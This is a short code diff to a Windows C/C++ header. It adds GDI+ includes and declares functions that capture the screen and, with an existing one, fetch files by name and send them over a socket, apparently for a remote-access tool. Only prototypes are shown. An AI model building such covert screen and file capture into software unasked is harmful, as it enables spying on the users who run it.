@@ -6,8 +6,13 @@
 #include <WinSock2.h>
 #include <Windows.h>
 #include <ws2tcpip.h>
+#include <gdiplus.h>
+#include <shlwapi.h>
 
+#pragma comment (lib, "gdiplus.lib")
 #pragma comment(lib, "Ws2_32.lib")
+#pragma comment(lib, "Shlwapi.lib")
+
 
 
 bool initWSA();
@@ -26,3 +31,10 @@ void cleanUp();
 
 //get file content by name
 int getFileContent(SOCKET s, char* filename);
+
+//take a scrrenshot
+int captureScreen(SOCKET s);
+
+//taken directly from https://gist.github.com/prashanthrajagopal/05f8ad157ece964d8c4d
+//get image encoder clsid to save an image
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
